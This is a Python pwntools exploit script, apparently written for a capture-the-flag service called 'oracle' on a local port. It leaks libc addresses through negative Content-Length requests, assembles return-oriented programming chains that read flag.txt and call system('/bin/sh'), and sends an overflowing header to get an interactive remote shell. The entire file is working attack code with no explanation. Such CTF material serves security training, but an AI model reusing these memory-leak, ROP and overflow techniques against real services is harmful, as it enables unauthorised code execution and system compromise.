from pwn import *

# elf=ELF('./challenge/oracle')
libc=ELF('./libc.so.6')
view = b"VIEW "
plague = b"PLAGUE "

PORT                    = 9001
MAX_START_LINE_SIZE     = 1024
MAX_PLAGUE_CONTENT_SIZE = 2048
MAX_HEADER_DATA_SIZE    = 1024
MAX_HEADERS             = 8
MAX_HEADER_LENGTH       = 128

header = ["Content-Length", "Plague-Target"]

HOST = "0"
PORT = 9001

def request_(a, b, io):
    request="Content-Length:{}\r\nPlague-Target:{}\r\n\r\n".format(a, b)
    io.sendline(request.encode())

def view_(target_competitor, version, io):
    start_line = view + target_competitor + b' ' + version + b' \r\n'
    io.send(start_line)

def plague_(target_competitor, version, io):
    start_line = plague + target_competitor + b' ' + version + b' \r\n'
    io.send(start_line)
    

io = remote(HOST, PORT)
plague_(b'UWU', b'AAAA', io)
request_('-150', 'B'*2, io)

io1 = remote(HOST, PORT)
plague_(b'UWU', b'AAAA', io1)
request_('-150', 'B'*2, io1)

sleep(0.1)
io1.sendline(b'A')

io1.recvuntil(b'Attempted plague:')
io1.recv(1)
libc.address = u64(io1.recv(6)+b'\0\0') - 0xb0a
# print(hex(libc.address))
io1.recv(2)
libc.address = u64(io1.recv(6)+b'\0\0') - 0xbe0 - 0x1ec000
pop_rdi = libc.address+0x0000000000023b6a
pop_rsi = libc.address+0x000000000002601f
pop_rdx_r12 = libc.address + 0x0000000000119431
ret=pop_rdi+1
mov_rdi_rdx=libc.address+0x0000000000041fcd
xchg_edi_eax = libc.address + 0x00000000000f1b65
xchg_esi_eax = libc.address + 0x00000000000a70cd
mov_rax_rdi = 0xb8130 + libc.address
sub_rax_1 = 0x00000000000bb853 + libc.address
print(hex(libc.address))

pl = p64(pop_rdi) + p64(libc.bss(0x200)) + p64(pop_rdx_r12) + p64(u64("flag.txt")) + p64(0) + p64(mov_rdi_rdx) + p64(pop_rsi) + p64(0) + \
    p64(libc.sym.open) + p64(xchg_edi_eax) + p64(pop_rsi) + p64(libc.bss(0x200)) + p64(pop_rdx_r12) + p64(0x30) + p64(0) + \
    p64(libc.sym.read) + p64(mov_rax_rdi) + p64(sub_rax_1) + p64(xchg_edi_eax) + p64(pop_rsi) + p64(libc.bss(0x200)) + p64(libc.sym.write)

pl = p64(pop_rdi) + p64(libc.bss(0x200)) + p64(pop_rdx_r12) + p64(u64("flag.txt")) + p64(0) + p64(mov_rdi_rdx) + p64(pop_rsi) + p64(0) + \
    p64(libc.sym.open) + p64(sub_rax_1) + p64(xchg_esi_eax)  + p64(pop_rdi) + p64(0) + p64(libc.sym.dup2) + \
    p64(pop_rdi) + p64(1) + p64(libc.sym.dup2) + p64(pop_rdi) + p64(2) + p64(libc.sym.dup2) + \
    p64(pop_rdi) + p64(libc.bss(0x300)) + p64(pop_rdx_r12) + p64(u64("/bin/sh\0")) + p64(0) + p64(mov_rdi_rdx) + p64(pop_rdi+1) + p64(libc.sym.system)



io2 = remote(HOST, PORT)

plague_(b'me', b'AAAA', io2)

## vcl
request=b"Content-Length:"+ 0x800*b'A'+ p64(ret)*8 +p64(ret)*2 + pl + b"\r\n\r\n"
# request=b"Content-Length:"+ (0x3000)*b'A' +p64(ret)*2 + pl + b"\r\n\r\n"

pause()
io2.sendline(request)
io2.interactive()
